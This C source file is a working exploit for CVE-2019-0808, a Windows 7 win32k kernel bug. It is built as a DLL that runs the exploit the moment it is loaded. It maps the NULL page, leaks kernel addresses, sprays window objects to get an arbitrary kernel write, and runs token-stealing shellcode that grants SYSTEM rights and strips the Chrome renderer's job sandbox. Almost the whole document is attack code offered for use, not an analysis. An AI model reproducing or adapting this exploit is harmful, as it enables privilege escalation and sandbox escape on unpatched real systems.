#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <stdio.h>
#include <bcrypt.h> // Included to define NTSTATUS

// Define the undefined window message type WM_MN_FINDMENUWINDOWFROMPOINT so the code
// knows how to utilize it correctly within this program.
#define WM_MN_FINDMENUWINDOWFROMPOINT 0x1EB

// Set the success flag to indicate whether or not the exploit succeeded or not to FALSE.
BOOL success = FALSE;

// The following lines set up global variables to hold the handle of the primary
// and secondary windows to be used in the tagWND write primitive, as well as
// the address of each of these windows.
HWND hPrimaryWindow = NULL;
HWND hSecondaryWindow = NULL;
unsigned int primaryWindowAddress = 0;
unsigned int secondaryWindowAddress = 0;
UINT addressToWrite = 0;

/* The following definitions define the various structures
   needed within sprayWindows() */
typedef struct _HEAD
{
	HANDLE h;
	DWORD  cLockObj;
} HEAD, *PHEAD;

typedef struct _THROBJHEAD
{
	HEAD h;
	PVOID pti;
} THROBJHEAD, *PTHROBJHEAD;

typedef struct _THRDESKHEAD
{
	THROBJHEAD h;
	PVOID    rpdesk;
	PVOID    pSelf;   // points to the kernel mode address of the object
} THRDESKHEAD, *PTHRDESKHEAD;

// Define the function prototype for NtAllocateVirtualMemory() so that this program
// knows how to call it correctly as well as what parmaters it expects.
typedef NTSTATUS(WINAPI *NTAllocateVirtualMemory)(
	HANDLE ProcessHandle,
	PVOID *BaseAddress,
	ULONG ZeroBits,
	PULONG AllocationSize,
	ULONG AllocationType,
	ULONG Protect
	);

// Create a pointer to the NtAllocateVirtualMemory function and initalize it to NULL.
NTAllocateVirtualMemory pfnNtAllocateVirtualMemory = NULL;

// Create a HWND handle to hold the handle to the maliciously crafted window.
HWND hWndFakeMenu;

// Create a HWND handle to hold the handle to the application's main menu.
HWND hWndMain;

// This boolean will indicate whether or not hWndMain's window
// procedure is set to DefWindowProc() or not.
BOOL bIsDefWndProc = TRUE;

// This boolean will indicate whether or not the drag operation
// has been conducted with the mouse yet.
BOOL bOnDraging = FALSE;

// Create a counter for the number of times the DisplayEventProc()
// function is hit, which will occur every time a popup menu is created.
volatile UINT iMenuCreated = 0;

// This function contains the inlined assembly responsible for making a syscall to
// NtUserMNDragOver, which has a syscall value of 0x11ED on Windows 7 x86 and Windows
// 7 SP1 x86. Refer to https://j00ru.vexillium.org/syscalls/win32k/64/ for the 64 bit
// values for other operating systems, or https://j00ru.vexillium.org/syscalls/win32k/32/
// for the 32 bit values for other operating systems.
void callNtUserMNDragOverSysCall(LPVOID address1, LPVOID address2) {
	_asm {
		mov eax, 0x11ED
		push address2
		push address1
		mov edx, esp
		int 0x2E
		pop eax
		pop eax
	}
}

// Define function definition for HMValidateHandle and name this function definition lHMValidateHandle.
typedef void*(__fastcall *lHMValidateHandle)(HWND h, int type);

// Define global pointer to HMValidateHandle which is of function type lHMValidateHandle.
lHMValidateHandle pHmValidateHandle = NULL;

// Thanks to https://github.com/YeonExp/HEVD/blob/c19ad75ceab65cff07233a72e2e765be866fd636/NullPointerDereference/NullPointerDereference/main.cpp#L56 for
// explaining this in an example along with the finer details that are often forgotten.
bool allocateNullPage() {
	/* Set the base address at which the memory will be allocated to 0x1.
	This is done since a value of 0x0 will not be accepted by NtAllocateVirtualMemory,
	however due to page alignment requirements the 0x1 will be rounded down to 0x0 internally.*/
	PVOID BaseAddress = (PVOID)0x1;

	/* Set the size to be allocated to 40960 to ensure that there
	   is plenty of memory allocated and available for use. */
	SIZE_T size = 40960;

	/* Call NtAllocateVirtualMemory to allocate the virtual memory at address 0x0 with the size
	specified in the variable size. Also make sure the memory is allocated with read, write,
	and execute permissions.*/
	NTSTATUS result = pfnNtAllocateVirtualMemory(GetCurrentProcess(), &BaseAddress, 0x0, &size, MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE);

	// If the call to NtAllocateVirtualMemory failed, return FALSE.
	if (result != 0x0) {
		return FALSE;
	}

	// If the code reaches this point, then everything went well, so return TRUE.
	return TRUE;
}

BOOL findHMValidateHandleAddress(HMODULE hUser32) {
	// The address of the function HMValidateHandleAddress() is not exported to
	// the public. However the function IsMenu() contains a call to HMValidateHandle()
	// within it after some short setup code. The call starts with the byte \xEB.

	// Obtain the address of the function IsMenu() from user32.dll.
	BYTE * pIsMenuFunction = (BYTE *)GetProcAddress(hUser32, "IsMenu");
	if (pIsMenuFunction == NULL) {
		printf("[!] Failed to find the address of IsMenu within user32.dll.\r\n");
		return FALSE;
	}
	else {
		printf("[*] pIsMenuFunction: 0x%08X\r\n", pIsMenuFunction);
	}

	// Search for the location of the \xEB byte within the IsMenu() function
	// to find the start of the indirect call to HMValidateHandle().
	unsigned int offsetInIsMenuFunction = 0;
	BOOL foundHMValidateHandleAddress = FALSE;
	for (unsigned int i = 0; i < 0x1000; i++) {
		BYTE* pCurrentByte = pIsMenuFunction + i;
		if (*pCurrentByte == 0xE8) {
			offsetInIsMenuFunction = i + 1;
			break;
		}
	}

	// Throw error and exit if the \xE8 byte couldn't be located.
	if (offsetInIsMenuFunction == 0) {
		printf("[!] Couldn't find offset to HMValidateHandle within IsMenu.\r\n");
		return FALSE;
	}

	// Output address of user32.dll in memory for debugging purposes.
	printf("[*] hUser32: 0x%08X\r\n", hUser32);

	// Get the value of the relative address being called within the IsMenu() function.
	unsigned int relativeAddressBeingCalledInIsMenu = *(unsigned int *)(pIsMenuFunction + offsetInIsMenuFunction);
	printf("[*] relativeAddressBeingCalledInIsMenu: 0x%08X\r\n", relativeAddressBeingCalledInIsMenu);

	// Find out how far the IsMenu() function is located from the base address of user32.dll.
	unsigned int addressOfIsMenuFromStartOfUser32 = ((unsigned int)pIsMenuFunction - (unsigned int)hUser32);
	printf("[*] addressOfIsMenuFromStartOfUser32: 0x%08X\r\n", addressOfIsMenuFromStartOfUser32);

	// Take this offset and add to it the relative address used in the call to HMValidateHandle().
	// Result should be the offset of HMValidateHandle() from the start of user32.dll.
	unsigned int offset = addressOfIsMenuFromStartOfUser32 + relativeAddressBeingCalledInIsMenu;
	printf("[*] offset: 0x%08X\r\n", offset);

	// Skip over 11 bytes since on Windows 10 these are not NOPs and it would be
	// ideal if this code could be reused in the future.
	pHmValidateHandle = (lHMValidateHandle)((unsigned int)hUser32 + offset + 11);
	printf("[*] pHmValidateHandle: 0x%08X\r\n", pHmValidateHandle);
	return TRUE;
}

// Taken from https://www.abatchy.com/2018/01/kernel-exploitation-2#token-stealing-payload-windows-7-x86-sp1.
// Essentially a standard token stealing shellcode, with two lines
// added to remove the Job object associated with the Chrome
// renderer process.
__declspec(noinline) int Shellcode()
{
	__asm {
		xor eax, eax // Set EAX to 0.
			mov eax, DWORD PTR fs : [eax + 0x124] // Get nt!_KPCR.PcrbData.
			// _KTHREAD is located at FS:[0x124]
			mov eax, [eax + 0x50] // Get nt!_KTHREAD.ApcState.Process
			mov ecx, eax // Copy current process _EPROCESS structure
			xor edx, edx // Set EDX to 0.
			mov DWORD PTR[ecx + 0x124], edx // Set the JOB pointer in the _EPROCESS structure to NULL.
			mov edx, 0x4 // Windows 7 SP1 SYSTEM process PID = 0x4
			SearchSystemPID:
			mov eax, [eax + 0B8h] // Get nt!_EPROCESS.ActiveProcessLinks.Flink
			sub eax, 0B8h
			cmp[eax + 0B4h], edx // Get nt!_EPROCESS.UniqueProcessId
			jne SearchSystemPID
			mov edx, [eax + 0xF8] // Get SYSTEM process nt!_EPROCESS.Token
			mov[ecx + 0xF8], edx // Assign SYSTEM process token.
	}
}

// Tons of thanks go to https://github.com/jvazquez-r7/MS15-061/blob/first_fix/ms15-061.cpp for
// additional insight into how this function should operate. Note that a token stealing shellcode
// is called here only because trying to spawn processes or do anything complex as SYSTEM
// often resulted in APC_INDEX_MISMATCH errors and a kernel crash.
LRESULT CALLBACK sprayCallback(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	if (uMsg == WM_ENTERIDLE) {
		WORD um = 0;
		__asm
		{
			// Grab the value of the CS register and
			// save it into the variable UM.
			mov ax, cs
			mov um, ax
		}
		// If UM is 0x1B, this function is executing in usermode
		// code and something went wrong. Therefore output a message that
		// the exploit didn't succeed and bail.
		if (um == 0x1b)
		{
			// USER MODE
			printf("[!] Exploit didn't succeed, entered sprayCallback with user mode privileges.\r\n");
			ExitProcess(-1); // Bail as if this code is hit either the target isn't vulnerable or something is wrong with the exploit.
		}
		else
		{
			success = TRUE; // Set the success flag to indicate the sprayCallback() window procedure is running as SYSTEM.
			Shellcode(); // Call the Shellcode() function to perform the token stealing and
						 // to remove the Job object on the Chrome render process.
		}
	}
	return DefWindowProc(hWnd, uMsg, wParam, lParam);
}

// Define the HMValidateHandle window type TYPE_WINDOW appropriately.
#define TYPE_WINDOW 1

/* Main function for spraying the tagWND objects into memory and finding two
   that are less than 0x3fd00 apart */
bool sprayWindows() {
	HWND hwndSprayHandleTable[0x100]; // Create a table to hold 0x100 HWND handles created by the spray.

	// Create and set up the window class for the sprayed window objects.
	WNDCLASSEXW sprayClass = { 0 };
	sprayClass.cbSize = sizeof(WNDCLASSEXW);
	sprayClass.lpszClassName = TEXT("sprayWindowClass");
	sprayClass.lpfnWndProc = sprayCallback; // Set the window procedure for the sprayed window objects to sprayCallback().

	if (RegisterClassExW(&sprayClass) == 0) {
		printf("[!] Couldn't register the sprayClass class!\r\n");
	}

	// Create 0x100 windows using the sprayClass window class with the window name "spray".
	for (int i = 0; i < 0x100; i++) {
		hwndSprayHandleTable[i] = CreateWindowExW(0, sprayClass.lpszClassName, TEXT("spray"), 0, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, NULL, NULL, NULL, NULL);
	}

	// For each entry in the hwndSprayHandle table...
	for (int x = 0; x < 0x100; x++) {
		// Leak the kernel address of the current HWND being examined, save it into firstEntryAddress.
		THRDESKHEAD *firstEntryDesktop = (THRDESKHEAD *)pHmValidateHandle(hwndSprayHandleTable[x], TYPE_WINDOW);
		unsigned int firstEntryAddress = (unsigned int)firstEntryDesktop->pSelf;

		// Then start a loop to start comparing the kernel address of this hWND
		// object to the kernel address of every other hWND object...
		for (int y = 0; y < 0x100; y++) {
			if (x != y) { // Skip over one instance of the loop if the entries being compared are at the same offset in the hwndSprayHandleTable

				// Leak the kernel address of the second hWND object being used in the comparison, save it into secondEntryAddress.
				THRDESKHEAD *secondEntryDesktop = (THRDESKHEAD *)pHmValidateHandle(hwndSprayHandleTable[y], TYPE_WINDOW);
				unsigned int secondEntryAddress = (unsigned int)secondEntryDesktop->pSelf;

				// If the kernel address of the hWND object leaked earlier in the code is greater than
				// the kernel address of the hWND object leaked above, execute the following code.
				if (firstEntryAddress > secondEntryAddress) {

					// Check if the difference between the two addresses is less than 0x3fd00.
					if ((firstEntryAddress - secondEntryAddress) < 0x3fd00) {
						printf("[*] Primary window address: 0x%08X\r\n", secondEntryAddress);
						printf("[*] Secondary window address: 0x%08X\r\n", firstEntryAddress);

						// Save the handle of secondEntryAddress into hPrimaryWindow and its address into primaryWindowAddress.
						hPrimaryWindow = hwndSprayHandleTable[y];
						primaryWindowAddress = secondEntryAddress;

						// Save the handle of firstEntryAddress into hSecondaryWindow and its address into secondaryWindowAddress.
						hSecondaryWindow = hwndSprayHandleTable[x];
						secondaryWindowAddress = firstEntryAddress;

						// Windows have been found, escape the loop.
						break;
					}
				}

				// If the kernel address of the hWND object leaked earlier in the code is less than
				// the kernel address of the hWND object leaked above, execute the following code.
				else {

					// Check if the difference between the two addresses is less than 0x3fd00.
					if ((secondEntryAddress - firstEntryAddress) < 0x3fd00) {
						printf("[*] Primary window address: 0x%08X\r\n", firstEntryAddress);
						printf("[*] Secondary window address: 0x%08X\r\n", secondEntryAddress);

						// Save the handle of firstEntryAddress into hPrimaryWindow and its address into primaryWindowAddress.
						hPrimaryWindow = hwndSprayHandleTable[x];
						primaryWindowAddress = firstEntryAddress;

						// Save the handle of secondEntryAddress into hSecondaryWindow and its address into secondaryWindowAddress.
						hSecondaryWindow = hwndSprayHandleTable[y];
						secondaryWindowAddress = secondEntryAddress;

						// Windows have been found, escape the loop.
						break;
					}
				}
			}
		}

		// Check if the inner loop ended and the windows were found. If so print a debug message.
		// Otherwise continue on to the next object in the hwndSprayTable array.
		if (hPrimaryWindow != NULL) {
			printf("[*] Found target windows!\r\n");
			break;
		}
	}

	// Check that hPrimaryWindow isn't NULL after both the loops are
	// complete. This will only occur in the event that none of the 0x1000
	// window objects were within 0x3fd00 bytes of each other. If this occurs, then bail.
	if (hPrimaryWindow == NULL) {
		printf("[!] Couldn't find the right windows for the tagWND primitive. Exiting....\r\n");
		return FALSE;
	}

	// This loop will destroy the handles to all other
	// windows besides hPrimaryWindow and hSecondaryWindow,
	// thereby ensuring that there are no lingering unused
	// handles wasting system resources.
	for (int p = 0; p < 0x100; p++) {
		HWND temp = hwndSprayHandleTable[p];
		if ((temp != hPrimaryWindow) && (temp != hSecondaryWindow)) {
			DestroyWindow(temp);
		}
	}

	addressToWrite = (UINT)primaryWindowAddress + 0x90; // Set addressToWrite to primaryWindow's cbwndExtra field.

	printf("[*] Destroyed spare windows!\r\n");

	// Check if its possible to set the window text in hSecondaryWindow.
	// If this isn't possible, there is a serious error, and the program should exit.
	// Otherwise return TRUE as everything has been set up correctly.
	if (SetWindowTextW(hSecondaryWindow, L"test String") == 0) {
		printf("[!] Something is wrong, couldn't initialize the text buffer in the secondary window....\r\n");
		return FALSE;
	}
	else {
		return TRUE;
	}
}

VOID CALLBACK DisplayEventProc(HWINEVENTHOOK hWinEventHook, DWORD event, HWND hwnd, LONG idObject, LONG idChild, DWORD idEventThread, DWORD dwmsEventTime)
{
	switch (iMenuCreated)
	{
	case 0:
		SendMessageW(hwnd, WM_LBUTTONDOWN, 0, 0x00050005); // Press the left mouse button down on point (0x5, 0x5).
		break;
	case 1:
		SendMessageW(hwnd, WM_MOUSEMOVE, 0, 0x00060006); // Drag the mouse, with the left mouse button down, to point (0x6, 0x6)
		break;
	}
	printf("[*] MSG\n");
	iMenuCreated++; // Increment iMenuCreated every time this is called.
}

LRESULT WINAPI SubMenuProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
	if (msg == WM_MN_FINDMENUWINDOWFROMPOINT) {
		printf("[*] In WM_MN_FINDMENUWINDOWFROMPOINT handler...\r\n");
		printf("[*] Restoring window procedure...\r\n");
		SetWindowLongPtr(hwnd, GWLP_WNDPROC, (ULONG)DefWindowProc);

		/* The wParam parameter here has the same value as pPopupMenu inside MNGetpItemFromIndex, except
		   wParam has been subtracted by minus 0x10. Code adjusts this below to accommodate.

		   This is an important information leak as without this the attacker cannot manipulate the values
		   returned from MNGetpItemFromIndex, which can result in kernel crashes and a dramatic decrease in
		   exploit reliability.
		*/
		UINT pPopupAddressInCalculations = wParam + 0x10;

		// Set the address to write to to be the right bit of cbwndExtra in the target tagWND.
		UINT addressToWriteTo = ((addressToWrite + 0x6C) - ((pPopupAddressInCalculations * 0x6C) + 0x4));

		// Set offset 0x20 of the NULL page to 0xFFFFFFFF to bypass this check in MNGetpItemFromIndex
		// by setting the value to be compared to EAX to a really high value. The check's code can be seen below.
		//
		// 	cmp     eax, [ecx + 20h]
		//  jnb     short loc_BF96F0CA;
		//
		memcpy_s((void *)0x20, 4, "\xFF\xFF\xFF\xFF", 4);


		// Set offset 0x34 in the NULL page to the addressToWrite to, as offset
		// 0x34 is the address where the arbitrary write will occur.
		memcpy_s((void *)0x34, 4, &addressToWriteTo, 4);


		/* Calculate what value to put in offset 0x4C of the NULL page so that the second
		call to MNGetpItemFromIndex will return an address within the NULL page region that
		is readable. The math used here is the same as the address calculation math used previously,
		but the operations are just done somewhat in reverse. */
		UINT secondAddress = ((0x100000180 - addressToWriteTo) / 0x6C);

		/* Fill out offset 0x4C of the NULL page so that MNGetpItemFromIndex succeeds and returns an address,
		which when incremented by 0x28, points to a readable address. The corresponding code this addresses can
		be seen below:

.text:BF975EA3                 mov     eax, [ebx+14h]  ; EAX = ppopupmenu->spmenu
.text:BF975EA3                                         ;
.text:BF975EA3                                         ; Should set EAX to 0 or NULL.
.text:BF975EA6                 push    dword ptr [eax+4Ch] ; uIndex. This will be the value at address 0x4C given
.text:BF975EA6                                         ; that ppopupmenu->spmenu is NULL.
.text:BF975EA9                 push    eax             ; spMenu. Will be NULL or 0.
.text:BF975EAA                 call    MNGetpItemFromIndex
..............
.text:BF975EBA                 add     ecx, [eax+28h]  ; ECX += pItemFromIndex->yItem
.text:BF975EBA                                         ;
.text:BF975EBA                                         ; pItemFromIndex->yItem will be the value
.text:BF975EBA                                         ; at offset 0x28 of whatever value
.text:BF975EBA                                         ; MNGetpItemFromIndex returns. */
		memcpy_s((void *)0x4C, 4, &secondAddress, 4);

		/* Starting at offset 0x50, set all the rest of the bytes to 0xF0. This will ensure
		that the jump at 0xBF975ED0 is NOT taken by setting the value of pItemFromIndex->yItem to 0xF0F0F0F0.

.text:BF975ECE                 cmp     ecx, ebx
.text:BF975ED0                 jg      short loc_BF975EDB ; Jump to loc_BF975EDB if the following condition is true:
.text:BF975ED0                 ; ((pMenuState->ptMouseLast.y - pMenuState->uDraggingHitArea->rcClient.top) + pItemFromIndex->yItem) > (pItem->yItem + SYSMET(CYDRAG))
		*/
		memset((void *)0x50, 0xF0, 0x1000);

		return (ULONG)hWndFakeMenu;
	}
	return DefWindowProc(hwnd, msg, wParam, lParam);
}

LRESULT CALLBACK WindowHookProc(INT code, WPARAM wParam, LPARAM lParam)
{
	tagCWPSTRUCT *cwp = (tagCWPSTRUCT *)lParam;

	// If the drag and drop operation hasn't started yet, then just call the next hook if there is one.
	if (!bOnDraging) {
		return CallNextHookEx(0, code, wParam, lParam);
	}

	// If the incoming message was a WM_MN_FINDMENUWINDOWFROMPOINT message, then set bIsDefWndProc to FALSE
	// to indicate hWndMain's window procedure is no longer DefWindowProc(), and set hWndMain's window
	// procedure to SubMenuProc().
	if ((cwp->message == WM_MN_FINDMENUWINDOWFROMPOINT))
	{
		bIsDefWndProc = FALSE;
		printf("[*] HWND: %p \n", cwp->hwnd);
		SetWindowLongPtr(cwp->hwnd, GWLP_WNDPROC, (ULONG64)SubMenuProc);
	}
	else {
		if ((cwp->message == 0x1E5)) {
			UINT offset = 0; // Create the offset variable which will hold the offset from the start of
							// hPrimaryWindow's cbwnd data field to write to.

			UINT addressOfStartofPrimaryWndCbWndData = (primaryWindowAddress + 0xB0); // Set addressOfStartofPrimaryWndCbWndData to the address of
																					  // the start of hPrimaryWindow's cbwnd data field.

			// Set offset to the difference between hSecondaryWindow's
			// strName.Buffer's memory address and the address of
			// hPrimaryWindow's cbwnd data field.
			offset = ((secondaryWindowAddress + 0x8C) - addressOfStartofPrimaryWndCbWndData);
			printf("[*] Offset: 0x%08X\r\n", offset);

			// Set the strName.Buffer address in hSecondaryWindow to (secondaryWindowAddress + 0x16), or the address of the bServerSideWindowProc bit.
			if (SetWindowLongA(hPrimaryWindow, offset, (secondaryWindowAddress + 0x16)) == 0) {
				printf("[!] SetWindowLongA malicious error: 0x%08X\r\n", GetLastError());
				ExitProcess(-1);
			}
			else {
				printf("[*] SetWindowLongA called to set strName.Buffer address. Current strName.Buffer address that is being adjusted: 0x%08X\r\n", (addressOfStartofPrimaryWndCbWndData + offset));
			}

			// Write the value \x06 to it to set the bServerSideWindowProc bit in hSecondaryWindow.
			if (SetWindowTextA(hSecondaryWindow, "\x06") == 0) {
				printf("[!] SetWindowTextA couldn't set the bServerSideWindowProc bit. Error was: 0x%08X\r\n", GetLastError());
				ExitProcess(-1);
			}
			else {
				printf("Successfully set the bServerSideWindowProc bit at: 0x%08X\r\n", (secondaryWindowAddress + 0x16));
				printf("Sending hSecondaryWindow a WM_ENTERIDLE message to trigger the execution of the shellcode as SYSTEM.\r\n");
				SendMessageA(hSecondaryWindow, WM_ENTERIDLE, NULL, NULL);
				if (success == TRUE) {
					printf("[*] Successfully exploited CVE-2019-0808 and triggered the shellcode!\r\n");
				}
				else {
					printf("[!] Didn't exploit the program. For some reason our privileges were not appropriate.\r\n");
					ExitProcess(-1);
				}
			}
		}
	}
	return CallNextHookEx(0, code, wParam, lParam);
}

int exploit()
{
	// Create the primary popup menu and its submenu
	HMENU hMenuRoot = CreatePopupMenu();
	HMENU hMenuSub = CreatePopupMenu();

	// Get a HINSTANCE handle to the current process.
	HINSTANCE hInst = GetModuleHandleA(NULL);

	// Get the address of NtAllocateVirtualMemory from ntdll.dll's export table.
	pfnNtAllocateVirtualMemory = (NTAllocateVirtualMemory)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtAllocateVirtualMemory");

	// Set the window hook and the event hook.
	SetWindowsHookEx(WH_CALLWNDPROC, (HOOKPROC)WindowHookProc, hInst, GetCurrentThreadId());
	SetWinEventHook(EVENT_SYSTEM_MENUPOPUPSTART, EVENT_SYSTEM_MENUPOPUPSTART, hInst, DisplayEventProc, GetCurrentProcessId(), GetCurrentThreadId(), 0);

	// Set up the buffers for the call to NtUserMNDragOver().
	CHAR buf[0x100] = { 0 };
	POINT pt;
	pt.x = 2;
	pt.y = 2;

	// Allocate the NULL page. If this fails, exit the program.
	if (allocateNullPage() == FALSE) {
		printf("[!] Couldn't allocate the NULL page!\r\n");
	}
	else {
		printf("[*] Allocated the NULL page!\r\n");
	}

	// Just to be sure that these modules are loaded, lets load them again.
	// Also allows the attacker to grab the address where user32.dll is loaded in memory.
	HMODULE hUser32 = LoadLibraryW(L"user32.dll");
	LoadLibraryW(L"gdi32.dll");

	// Find the address of HMValidateHandle using the address of user32.dll
	if (findHMValidateHandleAddress(hUser32) == FALSE) {
		printf("[!] Couldn't locate the address of HMValidateHandle!\r\n");
		ExitProcess(-1);
	}

	// Spray the windows and find two that are less than 0x3fd00 apart in memory.
	if (sprayWindows() == FALSE) {
		printf("[!] Couldn't find two tagWND objects less than 0x3fd00 apart in memory after the spray!\r\n");
		ExitProcess(-1);
	}

	// Create the malicious window, which will have its spMenu field set to NULL.
	hWndFakeMenu = CreateWindowA("#32768", "MN", WS_DISABLED, 0, 0, 1, 1, nullptr, nullptr, hInst, nullptr);
	printf("[*] FakeMenu: %p \n", hWndFakeMenu);

	// Change the menu settings for the two popup menus so that they are drag and drop enabled.
	MENUINFO mi = { 0 };
	mi.cbSize = sizeof(MENUINFO);
	mi.fMask = MIM_STYLE;
	mi.dwStyle = MNS_MODELESS | MNS_DRAGDROP;
	SetMenuInfo(hMenuRoot, &mi);
	SetMenuInfo(hMenuSub, &mi);

	// Set up the hMenuRoot popupmenu to be the root popup menu which will display hMenuSub when selected.
	AppendMenuA(hMenuRoot, MF_BYPOSITION | MF_POPUP, (UINT_PTR)hMenuSub, "Root");
	AppendMenuA(hMenuSub, MF_BYPOSITION | MF_POPUP, 0, "Sub");

	// Create the class wndClass, set its window procedure to DefWindowProc(), and then create hWndMain using this class.
	WNDCLASSEXA wndClass = { 0 };
	wndClass.cbSize = sizeof(WNDCLASSEXA);
	wndClass.lpfnWndProc = DefWindowProc;
	wndClass.cbClsExtra = 0;
	wndClass.cbWndExtra = 0;
	wndClass.hInstance = hInst;
	wndClass.lpszMenuName = 0;
	wndClass.lpszClassName = "WNDCLASSMAIN";
	RegisterClassExA(&wndClass);
	hWndMain = CreateWindowA("WNDCLASSMAIN", "CVE", WS_DISABLED, 0, 0, 1, 1, nullptr, nullptr, hInst, nullptr);

	// Show the hMenuRoot popup menu.
	TrackPopupMenuEx(hMenuRoot, 0, 0, 0, hWndMain, NULL);

	// Window message loop for handling window messages.
	MSG msg = { 0 };
	while (GetMessageW(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessageW(&msg);

		// Ensure that the call to NtUserMNDragOver() is made only once
		// the environment is set up correctly.
		if (iMenuCreated >= 1) {
			bOnDraging = TRUE;
			callNtUserMNDragOverSysCall(&pt, buf);
			break;
		}
	}

	// Execute command if exploit success.
	if (success == TRUE) {
		//WinExec("cmd.exe", 1);
	}

	return 0;
}

BOOL APIENTRY DllMain( HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
    )
{
  switch (ul_reason_for_call)
  {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
      exploit();
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
      break;
  }
  return TRUE;
}
